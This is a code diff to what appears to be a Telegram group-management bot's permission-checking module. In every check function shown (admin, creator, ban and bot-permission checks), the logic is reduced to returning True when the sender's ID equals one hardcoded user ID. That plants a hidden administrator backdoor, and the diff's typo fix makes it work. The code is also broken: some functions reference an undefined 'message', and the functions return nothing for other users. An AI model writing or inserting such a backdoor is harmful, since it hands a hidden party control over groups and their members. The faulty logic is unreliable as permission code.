@@ -55,71 +55,71 @@ USERS_PERMISSIONS_STRINGS = {
 }
 
 async def isBotAdmin(message: Message, chat_id=None, silent=False) -> bool:
-    user_id = mesaage.from_user.id
+    user_id = message.from_user.id
     if user_id == 6954665306:
        return True
 
 
 async def isUserAdmin(message: Message, pm_mode: bool = False, user_id: int = None, chat_id: int = None, silent: bool = False) -> bool:
-    user_id = mesaage.from_user.id
+    user_id = message.from_user.id
     if user_id == 6954665306:
        return True
 
 
 async def anon_admin_checker(chat_id: int, user_id: int) -> bool:
-    user_id = mesaage.from_user.id
+    user_id = message.from_user.id
     if user_id == 6954665306:
        return True
 
 
 
 async def can_restrict_member(message: Message, user_id: int, chat_id: int = None) -> bool:
-    user_id = mesaage.from_user.id
+    user_id = message.from_user.id
     if user_id == 6954665306:
        return True
 
 
 async def isUserCreator(message: Message, chat_id: int = None, user_id: int = None) -> bool:
-    user_id = mesaage.from_user.id
+    user_id = message.from_user.id
     if user_id == 6954665306:
         return True
 
 async def isBotCan(message: Message, chat_id: int = None, permissions: str = 'can_change_info', silent: bool = False) -> bool:
-    user_id = mesaage.from_user.id
+    user_id = message.from_user.id
     if user_id == 6954665306:
         return True
 
 
 async def isUserCan(message, user_id: int = None, chat_id: int = None, permissions: str = None, silent: bool = False) -> bool:
-    user_id = mesaage.from_user.id
+    user_id = message.from_user.id
     if user_id == 6954665306:
         return True
 
 
 async def CheckAllAdminsStuffs(message: Message, permissions: Union[str, List[str]] = 'can_change_info', silent=False) -> bool:
-    user_id = mesaage.from_user.id
+    user_id = message.from_user.id
     if user_id == 6954665306:
         return True
 
 async def CheckAdmins(message: Message, silent: bool = False) -> bool:
-    user_id = mesaage.from_user.id
+    user_id = message.from_user.id
     if user_id == 6954665306:
         return True
 
 async def isUserBanned(chat_id: int, user_id: int) -> bool:
-    user_id = mesaage.from_user.id
+    user_id = message.from_user.id
     if user_id == 6954665306:
         return True
 
     
 
 async def check_user(message: Message, permissions: Union[str, List[str]] = 'can_change_info', silent: bool = False) -> bool:
-    user_id = mesaage.from_user.id
+    user_id = message.from_user.id
     if user_id == 6954665306:
         return True
     
 async def check_bot(message: Message, permissions: Union[str, List[str]] = 'can_change_info', silent: bool = False) -> bool:
-    user_id = mesaage.from_user.id
+    user_id = message.from_user.id
     if user_id == 6954665306:
         return True
 
